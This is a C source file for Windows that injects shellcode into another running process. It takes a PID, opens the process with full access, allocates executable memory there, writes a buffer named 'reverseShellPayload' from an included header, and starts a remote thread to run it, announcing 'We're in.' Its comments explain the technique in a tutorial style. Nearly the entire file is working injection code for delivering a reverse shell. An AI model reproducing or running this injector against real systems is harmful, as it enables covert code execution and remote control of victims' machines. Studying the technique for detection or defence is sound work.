#include <stdio.h>
#include <windows.h>
#include "shellcode.h"
/*
 * Fore remote process injection, we are attempting to 
 * write, read, and execute memory but in a remote process
 * that is outside the current process's virtual address space, 
 * and will lead to access violations if we try to treat that memory
 * like it's our own. Windows memory management will also prevent a remote
 * process from executing arbitrary memory that is outside of its address 
 * space.
 * This is why we need to use the Windows API functions
 * VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread
 * to allocate, write, and execute memory.
*/
int main(int argc, CHAR* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }
    
    HANDLE hProcess;
    HANDLE hRThread;
    PVOID remoteBuffer;

    printf("[+] Injecting to PID: %i\n", atoi(argv[1]));
    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (!hProcess) {
        printf("[!] Failed to get handle: %lu\n", GetLastError());
        return 0;
    }

    // Allocate memory IN TARGET PROCESS for the shellcode
    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        scSize, 
        (MEM_RESERVE | MEM_COMMIT), 
        PAGE_EXECUTE_READWRITE
    );
    if (remoteBuffer == NULL) {
        printf("[!] Failed to allocate buffer because of %d\n", GetLastError());
        CloseHandle(hProcess);
        return 0;
    }

    // Write the shellcode to the allocated memory 
    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    if (!WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        reverseShellPayload,
        scSize,
        NULL)){
        printf("[!] Failed to write shellcode because of %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    // Create a remote thread to execute the shellcode
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    hRThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hRThread) {
        printf("[!] Failed to create remote thread because of %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    printf("[+] We're in.\n");

    // Clean up
    CloseHandle(hRThread);
    CloseHandle(hProcess);
    printf("[+] Bye!\n");
    return 0;
}
